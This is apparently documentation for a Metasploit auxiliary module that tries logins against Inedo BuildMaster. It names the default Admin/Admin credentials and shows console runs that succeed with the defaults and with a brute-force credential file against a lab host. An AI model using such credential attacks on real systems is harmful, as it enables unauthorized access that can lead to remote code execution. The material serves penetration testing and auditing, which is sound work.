## Description

This module allows you to authenticate to Inedo BuildMaster, an application release automation tool.
The default credentials for BuildMaster are Admin/Admin. Gaining privileged access to BuildMaster can lead to remote code execution.

## Vulnerable Application

[Inedo's Windows installation guide](http://inedo.com/support/documentation/buildmaster/installation/windows-guide)

[Inedo website](http://inedo.com/)

## Verification Steps

1. Do: ```use auxiliary/scanner/http/buildmaster_login```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: Set credentials
5. Do: ```run```
6. You should see the module attempting to log in.

## Scenarios

### Attempt to login with the default credentials.

```
msf > use auxiliary/scanner/http/buildmaster_login
msf auxiliary(buildmaster_login) > set RHOSTS 10.0.0.39
RHOSTS => 10.0.0.39
msf auxiliary(buildmaster_login) > run

[+] 10.0.0.39:81          - Identified BuildMaster 5.7.3 (Build 1)
[*] 10.0.0.39:81          - Trying username:"Admin" with password:"Admin"
[+] SUCCESSFUL LOGIN - 10.0.0.39:81          - "Admin":"Admin"
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(buildmaster_login) >
```

### Brute force with credentials from file.

```
msf > use auxiliary/scanner/http/buildmaster_login 
msf auxiliary(buildmaster_login) > set RHOSTS 10.0.0.39
RHOSTS => 10.0.0.39
msf auxiliary(buildmaster_login) > set USERPASS_FILE ~/BuildMasterCreds.txt
USERPASS_FILE => ~/BuildMasterCreds.txt
msf auxiliary(buildmaster_login) > run

[+] 10.0.0.39:81          - Identified BuildMaster 5.7.3 (Build 1)
[*] 10.0.0.39:81          - Trying username:"Admin" with password:"test"
[-] FAILED LOGIN - 10.0.0.39:81          - "Admin":"test"
[*] 10.0.0.39:81          - Trying username:"Admin" with password:"wrong"
[-] FAILED LOGIN - 10.0.0.39:81          - "Admin":"wrong"
[*] 10.0.0.39:81          - Trying username:"Admin" with password:"Admin"
[+] SUCCESSFUL LOGIN - 10.0.0.39:81          - "Admin":"Admin"
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(buildmaster_login) > 
```
